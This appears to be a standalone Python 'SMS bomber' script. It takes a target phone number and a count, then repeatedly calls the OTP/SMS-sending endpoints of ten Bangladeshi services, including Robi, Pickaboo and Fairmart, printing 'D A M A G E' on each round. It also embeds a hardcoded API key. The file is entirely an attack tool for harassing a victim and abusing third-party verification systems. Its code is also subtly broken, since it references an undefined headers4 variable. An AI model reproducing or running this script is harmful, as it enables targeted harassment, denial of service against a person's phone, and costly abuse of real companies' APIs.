import requests

from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'

end = '\033[0m'


# CVALUE

blue = '\33[94m'

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan = "\033[96m"

end = '\033[0m'

print ("\033[32m")

print ("	 Mojib Rsm  \n\n")



number  = str(input("[>] Number : "))

amount = int(input("[>] Amount: "))

 

url1 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url2 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number

url3 = "https://ss.binge.buzz/otp/send/login"

headers3 = CaseInsensitiveDict()

headers3["Content-Type"] = "application/x-www-form-urlencoded"

data3 = "phone="+number

url4 = "https://api.meenaclick.com/api/front/sms/send/pin?cell_phone=88"+number+"&type=sign-up"


url5 = "https://www.pickaboo.com/smsprofile/otp/send/"
headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
headers5["X-Requested-With"] = "XMLHttpRequest"
data5 = "mobile="+number+"&eventType=customer_signup_otp&resend=5"

url6 = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88"+number
headers6 = CaseInsensitiveDict()
headers6["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
headers6["User-Agent"]="gzip"

url7 = "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88"+number


url8 = "http://apibeta.iqra-live.com/api/v2/sent-otp/"+number
headers8 = CaseInsensitiveDict()
headers8["x-user-channel"] = "apps"

url9 = "https://ghoori.com.bd/generate_otp_no_auth?mobileNo="+number

url10= "https://www.fairmart.com.bd/api/user/send-otp?mobile=88"+number






for i in range(amount):

	try:

		resp1 = requests.get(url1)
		
		resp2 = requests.get(url2)
		
		resp3 = requests.post(url3, headers=headers3, data=data3)
		
		resp4 = requests.post(url4, headers=headers4)
		
		resp5 = requests.post(url5,headers=headers5, data= data5)
		
		resp6 = requests.post(url6, headers=headers6)
		resp7 = requests.get(url7)
		
		resp8 = requests.get(url8,headers=headers8)
		
		resp9 = requests.post(url9)
		
		resp10 = requests.post(url10)

		

		print(str (i+1)+" D A M A G E  \n")

	

	except:

		print ("Please Make Sure Your Internet Connection")
